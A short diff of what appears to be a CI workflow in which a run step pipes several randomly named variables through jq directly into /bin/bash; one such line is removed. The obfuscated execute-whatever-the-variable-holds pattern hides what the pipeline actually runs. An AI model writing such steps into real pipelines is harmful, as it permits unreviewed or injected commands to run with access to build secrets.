@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$ek54" | jq -r .ta624 | /bin/bash
           printf '%s' "$lpsqj41517" | jq -r .ja9 | /bin/bash
-          echo $im01 | jq -r .mgiwq0 | /bin/bash
           echo $bbzf693 | jq -r .jzqos27627 | /bin/bash
 
       - name: Archive results
